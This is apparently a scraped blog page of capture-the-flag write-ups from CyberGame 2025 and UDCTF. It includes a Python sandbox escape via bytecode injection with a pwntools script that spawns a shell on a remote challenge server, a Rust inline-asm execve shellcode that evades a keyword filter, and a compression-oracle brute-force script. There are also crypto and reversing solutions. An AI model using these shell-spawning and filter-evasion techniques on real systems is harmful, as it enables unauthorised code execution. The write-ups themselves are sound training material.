poking around the file system for a while and exploring different objects exposed through directory traversal, I discovered a path that led straight into the internals of the Python runtime.\nBy navigating through /mnt, I found what appeared to be a dictionary like object that gave access to a chain of attributes and internal references. Following this path:\n/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__ I eventually landed on the __code__ object of the DirShell class’s __init__ method a goldmine in terms of introspection.\nFrom there, I dumped the constant pool of the bytecode using:\ncat co_consts /mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__$\u0026gt; cat co_consts (None, \u0026#39;░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓████████▓▒░ \\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ \\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ \\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░ ░▒▓█▓▒▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ \\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ \\n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓██▓▒░▒▓█▓▒░░▒▓█▓▒░ \\n░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓███████▓▒░ ░▒▓██▓▒░ ░▒▓█▓▒░▒▓██▓▒░▒▓████████▓▒░ \\n \\n \u0026#39;, \u0026#39;Welcome to our completely custom filesystem! you can use the following commands in our in-house built DirShell™:\u0026#39;, \u0026#39;ls - list files and directories\u0026#39;, \u0026#39;cd \u0026lt;dir\u0026gt; - change directory\u0026#39;, \u0026#39;cat \u0026lt;file\u0026gt; - print file contents\u0026#39;, \u0026#39;pwd - print current directory\u0026#39;, \u0026#39;touch \u0026lt;file\u0026gt; - create/rewrite a file (root only) - if the filename starts with @ it is read-only [beta]\u0026#39;, \u0026#39;mkdir \u0026lt;dir\u0026gt; - create a directory (root only) [beta]\u0026#39;, \u0026#39;rewrite \u0026lt;file\u0026gt; - rewrite a file with hex characters (root only) - bypasses read-only @ prefix. USE WITH CAUTION [beta]\u0026#39;, \u0026#39;su - switch to root user (secret password required)\u0026#39;, \u0026#39;exit - exit the shell\u0026#39;, \u0026#39;\\n\\n\u0026#39;, \u0026#39;The filesystem is read-only for non-root users but we are experimenting with write capabilities in our current beta version\u0026#39;, \u0026#39;mnt.json\u0026#39;, \u0026#39;r\u0026#39;, \u0026#39;I am a test content of a.txt\u0026#39;, \u0026#39;HELLO WORLD\u0026#39;, \u0026#39;Lorem ipsum dolor sit amet\u0026#39;, \u0026#39;aa.txt\u0026#39;, \u0026#39;aaaaaaaa\u0026#39;, (\u0026#39;a.txt\u0026#39;, \u0026#39;b.txt\u0026#39;, \u0026#39;c.txt\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;mnt\u0026#39;, \u0026#39;z\u0026#39;), False, \u0026#39;__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*\u0026amp;^\u0026#39;) /mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__ __YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*\u0026amp;^ Gaining Root Shell via Bytecode Injection # After successfully retrieving the root password by navigating deep into Python’s object model (as explained earlier), I gained access to the su command. This unlocked the ability to rewrite methods within the application a powerful privilege.\nThe plan was to hijack the touch command, whose implementation lives in:\n/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__` Python Bytecode Injection # The key to the exploit was rewriting the co_code of the touch method with custom Python bytecode, allowing us to hijack its behavior.\nMy payload built a new co_code byte sequence that:\nLoaded the __builtins__ dict using a crafted LOAD_FAST offset.\nAccessed __builtins__[\u0026quot;exec\u0026quot;].\nExecuted exec(input(...)) to get full code execution.\nHowever, since the locals layout was unknown, and LOAD_FAST uses an index, I had to brute-force the right index (x) to find the one pointing to __builtins__.\nHere’s a snippet from the brute-force harness:\nOOB = b\u0026#39;\u0026#39;.join([bytes([x]) for x in [ *([opmap[\u0026#39;EXTENDED_ARG\u0026#39;], x // 256] if x // 256 != 0 else []), opmap[\u0026#39;LOAD_FAST\u0026#39;], x % 256, ]])` import dis from opcode import opmap from pwn import * def rec_cd(path): for x in path.split(\u0026#34;/\u0026#34;): r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, f\u0026#34;cd {x}\u0026#34;) def assemble(ops): ret = b\u0026#34;\u0026#34; for op, arg in ops: opc = dis.opmap[op] ret += bytes([opc, arg]) return ret ROOT_PASSWORD = \u0026#34;__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*\u0026amp;^\u0026#34; x = 202 while True: try: print(f\u0026#34;Trying {x}\u0026#34;) # r = process([\u0026#34;python3\u0026#34;, \u0026#34;dirshell.py\u0026#34;]) r = remote(\u0026#34;exp.cybergame.sk\u0026#34;, 7001) # rec_cd(\u0026#34;/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, \u0026#34;su\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, ROOT_PASSWORD) rec_cd(\u0026#34;/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__\u0026#34;) # x = 265 OOB = b\u0026#39;\u0026#39;.join([bytes([x]) for x in [ *([opmap[\u0026#39;EXTENDED_ARG\u0026#39;], x // 256] if x // 256 != 0 else []), opmap[\u0026#39;LOAD_FAST\u0026#39;], x % 256, ]]) co_code = OOB + assemble([ (\u0026#34;LOAD_FAST\u0026#34;, 2), (\u0026#34;BINARY_SUBSCR\u0026#34;, 0), (\u0026#34;LOAD_FAST\u0026#34;, 1), ]) + OOB + assemble([ (\u0026#34;CALL_FUNCTION\u0026#34;, 2), (\u0026#34;RETURN_VALUE\u0026#34;, 0), ]) # print(co_code) # 265 EXEC r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, \u0026#34;rewrite co_code\u0026#34;) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, co_code.hex()) rec_cd(\u0026#34;/..\u0026#34;*17) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;\u0026#34;\u0026#34;touch exec(input(\u0026#39;READYREADYREADY\\\\n\u0026#39;))\u0026#34;\u0026#34;\u0026#34;) r.sendline(b\u0026#34;exec\u0026#34;) r.recvuntil(b\u0026#34;file contents: \u0026#34;) da = r.recvline(timeout=0.5).strip() print(da) if da == b\u0026#34;READYREADYREADY\u0026#34;: print(\u0026#34;GO FLAG GOGHGOGHGOGHGO\u0026#34;, x) r.sendline(b\u0026#34;import pty;pty.spawn(\u0026#39;/bin/sh\u0026#39;)\u0026#34;) r.interactive() except Exception as e: print(e) pass r.close() I assembled the final bytecode using Python\u0026rsquo;s built-in dis.opmap, creating valid instructions for Python 3.9 — which was crucial, since the remote system used that specific version.\nOnce the injected function was in place, I navigated back to root and triggered it by running:\ntouch exec(input(\u0026#39;READYREADYREADY\\n\u0026#39;)) If the injection worked, the output was simply: READYREADYREADY\nThis was my signal that exec() had been successfully injected. From there, I just launched a PTY shell:\nimport pty; pty.spawn(\u0026#39;/bin/sh\u0026#39;)` And that was game over. 🏁\nSK-CERT{\\u0074\\u0068\\u0069\\u0073\\u0020\\u0069\\u0073\\u0020\\u0066\\u0075\\u006E} Blazing-fast, memory-safe interpreter # Description\nI made a Rust code interpreter where you can run your rust code. I made it very safe so you don’t hack me.\nimport subprocess HEADER = \u0026#34;\u0026#34;\u0026#34; #![no_std] #![no_main] use core::panic::PanicInfo; #[panic_handler] fn panic(_info: \u0026amp;PanicInfo) -\u0026gt; ! { loop {} } #[unsafe(no_mangle)] pub extern \u0026#34;C\u0026#34; fn _start() -\u0026gt; () { \u0026#34;\u0026#34;\u0026#34; FOOTER = \u0026#34;\u0026#34;\u0026#34; } \u0026#34;\u0026#34;\u0026#34; def checker(code): if code.count(\u0026#34;!\u0026#34;) \u0026gt; 1: return 0 if \u0026#34;libc\u0026#34; in code: return 0 if \u0026#34;std\u0026#34; in code: return 0 if \u0026#34;flag\u0026#34; in code: return 0 if \u0026#34;syscall\u0026#34; in code: return 0 if \u0026#34;include\u0026#34; in code: return 0 return 1 code = input(\u0026#34;Give me code\u0026gt; \u0026#34;) if not checker(code): print(\u0026#34;Go away you hacker\u0026#34;) exit() with open(\u0026#34;./src/main.rs\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(HEADER) f.write(code) f.write(FOOTER) print(\u0026#34;Building - this may take a while...\u0026#34;,end=\u0026#34;\u0026#34;) out = subprocess.run( [\u0026#34;cargo\u0026#34;, \u0026#34;build\u0026#34;, \u0026#34;--target\u0026#34;, \u0026#34;x86_64-unknown-none\u0026#34;], capture_output=True, text=True ) if out.returncode: print(\u0026#34;failed - exit\u0026#34;) exit() print(\u0026#34;done\u0026#34;) print(\u0026#34;Running...\u0026#34;) subprocess.run([\u0026#34;cargo\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;--target\u0026#34;, \u0026#34;x86_64-unknown-none\u0026#34;]) Solution\nThis challenge gave us a sandboxed Rust runtime with a constrained custom main.rs environment.\nAfter researching Rust’s inline assembly and raw x86-64 opcodes, I discovered that we could manually emit syscall using the raw instruction bytes:\n.byte 0x0F, 0x05 ; syscall Combined with core::arch::asm, we could construct the entire RCE payload manually without relying on filtered terms.\nHere’s the payload that spawns /bin/sh via syscall 59 (execve):\nuse core::arch::asm; unsafe { asm!( \u0026#34;xor rsi, rsi\u0026#34;, // NULL argv \u0026#34;push rsi\u0026#34;, \u0026#34;mov rbx, 0x68732f2f6e69622f\u0026#34;, // //bin/sh \u0026#34;push rbx\u0026#34;, \u0026#34;mov rdi, rsp\u0026#34;, // pointer to \u0026#34;/bin//sh\u0026#34; \u0026#34;xor rdx, rdx\u0026#34;, // NULL envp \u0026#34;mov rax, 59\u0026#34;, // syscall: execve \u0026#34;.byte 0x0F, 0x05\u0026#34;, // syscall options(noreturn) ); } The build system only accepted single-line input, and multi-line asm! blocks were error-prone when passed via input().\nSo I collapsed the code into a single line:\nuse core::arch::asm;unsafe{asm!(\u0026#34;xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05\u0026#34;,options(noreturn));} This successfully compiled under cargo build --target x86_64-unknown-none, bypassed the checks, and gave me a shell from _start()!\nnc exp.cybergame.sk 7010 Give me code\u0026gt; use core::arch::asm;unsafe{asm!(\u0026#34;xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05\u0026#34;,options(noreturn));} Building - this may take a while...done Running... id uid=0(root) gid=0(root) groups=0(root) cat flag.txt SK-CERT{v3ry_600d_p3rf0rm4nc3} ","date":"June 11, 2025","externalUrl":null,"permalink":"/posts/2025-06-11-cybergame2025/","section":"Posts","summary":"\u003cp\u003eI took 1st place 🥇 in CyberGame 2025, solving 71 out of 73 challenges and claiming 52 First bloods 🩸 along the way.\n\u003cfigure\u003e\u003cimg\n    class=\"my-0 rounded-md\"\n    loading=\"lazy\"\n    decoding=\"async\"\n    fetchpriority=\"low\"\n    alt=\"image\"\n    src=\"https://gist.github.com/user-attachments/assets/3dbb099e-da02-455a-b608-7952b96faad2\"\n    \u003e\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003eThe game featured a wide variety of categories, including:\u003c/p\u003e","title":"Cybergame 2025 Writeups","type":"posts"},{"content":" XS2: Looper - xor school # Get Part of the XOR Key # To kick things off, We leveraged the magic of knowing the flag format udctf{. XORing this snippet against the start of the ciphertext started to reveal a familiar, cheeky pattern in CTFs: deadbe. At this point, the puzzle pieces were coming together.\ndef xor(msg, key): o = b\u0026#39;\u0026#39; for i in range(len(msg)): o += bytes([msg[i] ^ key[i % len(key)]]) return o ciphertext_hex = \u0026#34;11010210041e125508065109073a11563b1d51163d16060e54550d19\u0026#34; ciphertext_bytes = bytes.fromhex(ciphertext_hex) flagpart = \u0026#34;udctf{\u0026#34; def find_key(ciphertext, flagpart): possible_keys = [] for i in range(len(ciphertext) - len(flagpart) + 1): xor_result = xor(ciphertext[i:i+len(flagpart)], flagpart.encode()) if xor_result.isalnum(): possible_keys.append((i, xor_result.decode(\u0026#39;utf-8\u0026#39;, \u0026#39;ignore\u0026#39;))) return possible_keys keys = find_key(ciphertext_bytes, flagpart) for idx, key_part in keys: print(f\u0026#34;Found key segment at position {idx}: {key_part}\u0026#34;) Then it hit us — the challenge name, \u0026ldquo;Looper,\u0026rdquo; was no accident! It hinted that our partial key should loop, leading us to the classic full XOR key: deadbeef. A CTF favorite, deadbeef.\nGet the flag # def xor(msg, key): o = b\u0026#39;\u0026#39; for i in range(len(msg)): o += bytes([msg[i] ^ key[i % len(key)]]) return o ciphertext_hex = \u0026#34;11010210041e125508065109073a11563b1d51163d16060e54550d19\u0026#34; ciphertext_bytes = bytes.fromhex(ciphertext_hex) # \u0026#39;deadbeef\u0026#39; -\u0026gt; repeating key full_key = \u0026#34;deadbeef\u0026#34; decrypted_message = xor(ciphertext_bytes, full_key.encode()) print(f\u0026#34;Decrypted message: {decrypted_message.decode(\u0026#39;utf-8\u0026#39;, \u0026#39;ignore\u0026#39;)}\u0026#34;) flag udctf{w3lc0me_t0_x0r_sch00l} Training Problem: Intro to Reverse - training - reversing # We started by analyzing the given binary in IDA Pro, where we noticed a validation check on user input inline to the challenge description\nString in Binary: The binary contains a hardcoded string, ucaqbvl,n*d\\\\'R#!!l, stored in v5. Validation Logic: The program takes input and checks if each character in the input, adjusted by its index (s[i] - i), matches the corresponding character in v5.\nReversing the Check # Using the observed transformation, we wrote a Python script to generate the correct input by reversing the logic.\nv5 = \u0026#34;ucaqbvl,n*d\\\\\u0026#39;R#!!l\u0026#34; s = \u0026#39;\u0026#39;.join(chr(ord(v5[i]) + i) for i in range(len(v5))) print(s) flag: udctf{r3v3ng3_101} 🅱️rainrot.c - reversing # The challenge, Brainrot, required translating code words from the \u0026ldquo;brainrot\u0026rdquo; format and then reversing the logic to reveal part of the flag. After breaking down the logic and using translation techniques, we were left with a 4-letter word to complete the flag.\nSolution # Code Translation: We translated the given \u0026ldquo;brainrot\u0026rdquo; words back into their intended text format. Logic Reversal: We reversed the logical checks used in the challenge, piecing together the final portion of the flag. Final Search: A quick Google search confirmed the 4-letter word we needed: ohio. Translated C code\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void check_rule(int rule) { printf(\u0026#34;Flag\u0026#39;s a bust, rule %d ain\u0026#39;t vibin.\\n\u0026#34;, rule); exit(1); } void main() { char input[100]; printf(\u0026#34;Enter the flag: \u0026#34;); fgets(input, 100, stdin); int length = strlen(input); if (length \u0026gt; 0 \u0026amp;\u0026amp; input[length - 1] == \u0026#39;\\n\u0026#39;) { input[length - 1] = \u0026#39;\\0\u0026#39;; length -= 1; } if (length != 51) check_rule(0); char prefix[6] = \u0026#34; \u0026#34;; strncpy(prefix, input, 5); if (strcmp(prefix, \u0026#34;udctf\u0026#34;) != 0) check_rule(1); if (input[length - 1] != 0x7d) check_rule(2); if ((input[5] * 4) % 102 != \u0026#39;T\u0026#39;) check_rule(3); if ((input[35] | input[33]) != 0x69) check_rule(4); if (input[6] ^ input[31]) check_rule(5); if ((input[31] + input[35]) != (input[6] * 2)) check_rule(6); if ((input[7] == input[10]) + (input[14] == input[23]) + (input[28] == input[36]) != 3) check_rule(7); if (!((input[42] == input[28]) \u0026amp;\u0026amp; (input[36] == input[23]) \u0026amp;\u0026amp; (input[10] == input[42]))) check_rule(8); if (input[10] != 0x5f) check_rule(9); char fanum[7] = {0x47, 0x4a, 0x13, 0x42, 0x58, 0x57, 0x1b}; char simp[8] = \u0026#34; \u0026#34;; char vibe[8] = \u0026#34; \u0026#34;; char drip[9] = \u0026#34; \u0026#34;; strncpy(simp, input + 29, 7); strncpy(vibe, input + 43, 7); strncpy(drip, input + 15, 8); for (int i = 0; i \u0026lt; 7; i++) { simp[i] = fanum[i] ^ simp[i]; } for (int i = 0; i \u0026lt; 7; i++) { vibe[i] = fanum[i] ^ vibe[i]; } for (int i = 0; i \u0026lt; 8; i++) { drip[i] = vibe[i % 7] ^ drip[i]; } if (strcmp(simp, \u0026#34;r!zz13r\u0026#34;) != 0) check_rule(10); if (strcmp(vibe, \u0026#34;5ki8idi\u0026#34;) != 0) check_rule(11); char woke[9] = {0x40, 0x05, 0x5c, 0x48, 0x59, 0x0f, 0x5a, 0x5b, 0x00}; if (strcmp(drip, woke) != 0) check_rule(12); if ((input[24] | input[19]) != \u0026#39;0\u0026#39;) check_rule(13); if ((input[24] | input[27]) != \u0026#39;0\u0026#39;) check_rule(14); if (input[26] != input[44]) check_rule(15); char clout[7] = \u0026#34; \u0026#34;; strncpy(clout, input + 8, 6); for (int i = 0; i \u0026lt; 6; i++) { clout[i] = clout[i] + 1; } char zest[7] = {0x62, 0x6e, 0x60, 0x75, 0x69, 0x34, 0x00}; if (strcmp(clout, zest) != 0) check_rule(16); char snack[6] = \u0026#34; \u0026#34;; char L[6] = {0x05, 0x17, 0x01, 0x01, 0x1d, 0x00}; strncpy(snack, input + 37, 5); for (int i = 0; i \u0026lt; 5; i++) { snack[i] = snack[i] ^ zest[i]; } if (strcmp(snack, L) != 0) check_rule(17); printf(\u0026#34;All rules vibe! 😝👉👈 Flag is correct! ✅\\n\u0026#34;); } Solve Script # def check_constraints(flag): # Rule 0: Length must be 51 if len(flag) != 51: return False, 0 Rule 1: Must start with \u0026ldquo;udctf\u0026rdquo; # if flag[:5] != \u0026#34;udctf\u0026#34;: return False, 1 Rule 2: Must end with \u0026ldquo;}\u0026rdquo; # if flag[-1] != \u0026#39;}\u0026#39;: return False, 2 Rule 3: (flag[5]*4)%102 == \u0026lsquo;T\u0026rsquo; # if (ord(flag[5]) * 4) % 102 != ord(\u0026#39;T\u0026#39;): return False, 3 Rule 4: (flag[35] | flag[33]) == 0x69 # if (ord(flag[35]) | ord(flag[33])) != 0x69: return False, 4 Rule 5: flag[6] ^ flag[31] must be 0 # if ord(flag[6]) ^ ord(flag[31]): return False, 5 Rule 6: (flag[31] + flag[35]) == (flag[6] * 2) # if (ord(flag[31]) + ord(flag[35])) != (ord(flag[6]) * 2): return False, 6 Rule 7: These must all be equal # eq_count = (flag[7] == flag[10]) + (flag[14] == flag[23]) + (flag[28] == flag[36]) if eq_count != 3: return False, 7 Rule 8: Chain of equalities # if not (flag[42] == flag[28] and flag[36] == flag[23] and flag[10] == flag[42]): return False, 8 Rule 9: flag[10] must be \u0026lsquo;_\u0026rsquo; # if flag[10] != \u0026#39;_\u0026#39;: return False, 9 Rules 10-12: XOR operations # fanum = [0x47, 0x4a, 0x13, 0x42, 0x58, 0x57, 0x1b] Check simp (Rule 10) # simp = list(flag[29:36]) for i in range(7): simp[i] = chr(ord(simp[i]) ^ fanum[i]) if \u0026#39;\u0026#39;.join(simp) != \u0026#34;r!zz13r\u0026#34;: return False, 10 Check vibe (Rule 11) # vibe = list(flag[43:50]) for i in range(7): vibe[i] = chr(ord(vibe[i]) ^ fanum[i]) if \u0026#39;\u0026#39;.join(vibe) != \u0026#34;5ki8idi\u0026#34;: return False, 11 Check drip (Rule 12) # drip = list(flag[15:23]) woke = [0x40, 0x05, 0x5c, 0x48, 0x59, 0x0f, 0x5a, 0x5b] decrypted_drip = [] for i in range(8): decrypted_drip.append(ord(flag[43 + (i % 7)]) ^ fanum[i % 7] ^ ord(drip[i])) if decrypted_drip != woke: return False, 12 Rules 13-14: Position 24 constraints # if (ord(flag[24]) | ord(flag[19])) != ord(\u0026#39;0\u0026#39;): return False, 13 if (ord(flag[24]) | ord(flag[27])) != ord(\u0026#39;0\u0026#39;): return False, 14 Rule 15: flag[26] == flag[44] # if flag[26] != flag[44]: return False, 15 Rule 16: clout/zest relationship # clout = list(flag[8:14]) for i in range(6): clout[i] = chr(ord(clout[i]) + 1) zest = [0x62, 0x6e, 0x60, 0x75, 0x69, 0x34] if [ord(c) for c in clout[:6]] != zest: return False, 16 Rule 17: snack/L relationship # L = [0x05, 0x17, 0x01, 0x01, 0x1d] snack = list(flag[37:42]) for i in range(5): if ord(snack[i]) ^ zest[i] != L[i]: return False, 17 return True, -1 def test_flag(flag): result, rule = check_constraints(flag) if not result: print(f\u0026#34;Flag failed at rule {rule}\u0026#34;) else: print(\u0026#34;Flag passed all rules!\u0026#34;) return result Test the flag # flag = \u0026#34;udctf{Hi_am_th3_un5p0k3n_0_!0_5ki8idi_gyatt_r!zz13r}\u0026#34; print(f\u0026#34;Testing flag: {flag}\u0026#34;) print(f\u0026#34;Flag length: {len(flag)}\u0026#34;) test_flag(flag) udctf{Hi_am_th3_un5p0k3n_0_!0_5ki8idi_gyatt_r!zz13r}\nUpon analyzing the flag, we noticed the 0_!0 segment, which was key to completing the flag. After decoding the logic and piecing together the partial flag, we conducted a quick Google search for common brainrot words and discovered that \u0026ldquo;ohio\u0026rdquo; is a popular choice. This helped us fill in the missing 4-letter word.0_!0 u d c t f {Hi_am _th3_un5p0k3n_0_!0 _5ki8idi_gyatt_r!zz13r} Final flag: udctf{i_am_th3_un5p0k3n_0h!0_5ki8idi_gyatt_r!zz13r}\nAlgebrarbeglA - misc # Challenge # 78! - k = k - !87\nSolve for k flag format is udctf{k}\nSolution # For this challenge, we used Wolfram Alpha to handle the large factorial values directly.\nFlag udctf{387700288526444839185460979130991103610316350951544192244807199359099600806691328655309595021094080317314686982970896828895806969367}\nJust a day at the breach - lambda - crypto - web # Question:\nimport os import json import zlib def lambda_handler(event, context): try: payload=bytes.fromhex(event[\u0026#34;queryStringParameters\u0026#34;][\u0026#34;payload\u0026#34;]) flag = os.environ[\u0026#34;flag\u0026#34;].encode() message = b\u0026#34;Your payload is: %b\\nThe flag is: %b\u0026#34; % (payload, flag) compressed_length = len(zlib.compress(message,9)) except ValueError as e: return {\u0026#39;statusCode\u0026#39;: 500, \u0026#34;error\u0026#34;: str(e)} return { \u0026#39;statusCode\u0026#39;: 200, \u0026#39;body\u0026#39;: json.dumps({\u0026#34;sniffed\u0026#34;: compressed_length}) } Solution: char by char brute. Getting the smallest length is the correct character and appending it to the other resolved ones to complete the flag\nimport requests import string from concurrent.futures import ThreadPoolExecutor, as_completed url = \u0026#34;https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/\u0026#34; known_flag = \u0026#34;udctf\u0026#34; possible_chars = string.ascii_letters + string.digits + \u0026#34;{}_\u0026#34; def get_compressed_length(char): payload = known_flag + char hex_payload = payload.encode().hex() response = requests.get(url, params={\u0026#39;payload\u0026#39;: hex_payload}) return char, response.json().get(\u0026#39;sniffed\u0026#39;) while True: min_length = float(\u0026#39;inf\u0026#39;) next_char = \u0026#39;\u0026#39; with ThreadPoolExecutor(max_workers=10) as executor: # Adjust max_workers based on network capacity futures = [executor.submit(get_compressed_length, char) for char in possible_chars] for future in as_completed(futures): char, compressed_length = future.result() if compressed_length \u0026lt; min_length: min_length = compressed_length next_char = char if next_char: known_flag += next_char print(f\u0026#34;Current flag: {known_flag}\u0026#34;) else: break `````` Flag:`udctf{huffm4n_br34ched_l3t5_go` ![Pasted image 20241109041034](https://gist.github.com/user-attachments/assets/8831a5a1-b92b-4bf7-9740-75ecdc06dc8b) # Nonogram Pt. 1: Simple Enough - crypto ### Question: When you get past the puzzle, you now face a classic encryption / old-school stego encoding. Wrap the text you find in `UDCTF{TEXTHERE}``. ### Solution This was a nonogram puzzle - Nonogram Solver: We started with the nonogram puzzle and used https://fedimser.github.io/nonogram tool to recreate and solve the puzzle pattern provided. The solution revealed a coded message that required further analysis. - Cipher Identification: Next, we used dcode.fr’s Cipher Identifier to determine which cipher could have been used. We tested multiple options, and Bacon Cipher emerged as the solution. - Decoding: With Bacon Cipher identified, we decoded the message, which revealed the encoded string ![Pasted image 20241109215436](https://gist.github.com/user-attachments/assets/34b7e258-2457-460c-b044-ea4a72e3cd5b) ![image](https://gist.github.com/user-attachments/assets/99186959-87aa-4b0f-af1e-de383b93b23c) flag: UDCTF{PIXELATED} # Training Problem: Intro to RSA - crypto ### Question: ```python In [9]: p = getPrime(128) In [10]: q = getPrime(128) In [11]: N = p*q In [12]: bytes_to_long(flag) \u0026lt; N Out[12]: True In [13]: print(pow(bytes_to_long(flag), 65537, N), N) 9015202564552492364962954854291908723653545972440223723318311631007329746475 51328431690246050000196200646927542588629192646276628974445855970986472407007 Solution # Step 1: Understand the RSA Parameters Given # In RSA encryption, the public key consists of:\nN = p x 𝑞 N=p×q: the product of two prime numbers. 𝑒: the public exponent, which is given as 65537.\nWe also know: flag is a message that was encrypted with the public key, and The result of the encryption (c = pow(bytes_to_long(flag), e, N)) is given.\nThe goal is to find the original message, flag.\nStep 2: Factorize N # We use FactorDb Query to factorize 𝑁 into 𝑝 and 𝑞\nStep 3: Calculate the Private Key Exponent # The private exponent 𝑑 is calculated using the modular inverse of e e with respect to (p−1)(𝑞−1) which allows us to decrypt messages encrypted with 𝑒 In mathematical terms: mod((p−1)(q−1))\nStep 4: Decrypt the Ciphertext # Now that we have 𝑑 we can decrypt the ciphertext 𝑐 using the RSA decryption formula:\nHere, m is the decrypted message as an integer. We can then convert it back to bytes and decode it to reveal the original flag.\nfrom Crypto.Util.number import long_to_bytes # Extended GCD for modular inverse def extended_gcd(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = extended_gcd(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y # Modular inverse using extended GCD def modinv(a, m): _, x, _ = extended_gcd(a, m) return (x % m + m) % m # Given values N = 51328431690246050000196200646927542588629192646276628974445855970986472407007 e = 65537 c = 9015202564552492364962954854291908723653545972440223723318311631007329746475 # Factored values from factordb p = 186574907923363749257839451561965615541 q = 275108975057510790219027682719040831427 # Verify N = p * q assert p * q == N, \u0026#34;Factors are correct!\u0026#34; # Calculate φ(N) phi = (p - 1) * (q - 1) # Calculate private key d d = modinv(e, phi) # Decrypt the message m = pow(c, d, N) # Convert to bytes and print the flag flag = long_to_bytes(m) print(flag) udctf{just_4_s1mpl3_RS4}\nBees in Space # Get the binary from the txt provided # def analyze_spaces(text): # Split into lines lines = text.split(\u0026#39;\\n\u0026#39;) # Analyze each line for i, line in enumerate(lines): # Get spaces/tabs at start of line leading_spaces = len(line) - len(line.lstrip()) # Get count of spaces between words word_spaces = len([s for s in line.split() if s.isspace()]) # Convert spaces/tabs to binary (space=0, tab=1) binary = \u0026#39;\u0026#39;.join([\u0026#39;1\u0026#39; if c == \u0026#39;\\t\u0026#39; else \u0026#39;0\u0026#39; if c.isspace() else \u0026#39;\u0026#39; for c in line]) print(f\u0026#34;Line {i+1}:\u0026#34;) print(f\u0026#34;Leading spaces: {leading_spaces}\u0026#34;) print(f\u0026#34;Spaces between words: {word_spaces}\u0026#34;) print(f\u0026#34;Binary pattern: {binary}\u0026#34;) print() # Process the text text = \u0026#34;\u0026#34;\u0026#34;According to all known\tlaws of\taviation, there\tis no\tway a\tbee should be able to fly. Its\twings are too small\tto get its fat\tlittle body off the ground. The bee,\tof course, flies anyway because\tbees\tdon\u0026#39;t care\twhat humans think is impossible. Yellow, black.\tYellow, black.\tYellow, black.\tYellow, black. Ooh, black\tand yellow! Let\u0026#39;s shake it up a\tlittle. Barry! Breakfast is\tready!\tComing! Hang on\ta second. Hello? Barry? Adam? Can you\tbelieve\tthis\tis\thappening? I\tcan\u0026#39;t.\tI\u0026#39;ll pick\tyou up. Looking sharp. Use the stairs,\tYour\tfather\tpaid good\tmoney\tfor\tthose. Sorry.\tI\u0026#39;m excited. Here\u0026#39;s the graduate. We\u0026#39;re very\tproud\tof you,\tson. A perfect report card,\tall B\u0026#39;s. Very proud. Ma! I got a\tthing\tgoing here. You got\tlint on\tyour fuzz. Ow! That\u0026#39;s me! Wave to\tus!\tWe\u0026#39;ll\tbe in\trow 118,000. Bye! Barry,\tI told you, stop flying in the house!\tHey,\tAdam. Hey, Barry.\tIs\tthat fuzz\tgel? A little. Special day, graduation. Never\tthought\tI\u0026#39;d\tmake it. Three\tdays\tgrade school,\tthree days high school. Those were awkward.\tThree\tdays\tcollege. I\u0026#39;m glad I took a\tday and hitchhiked around The Hive. You did\tcome\tback 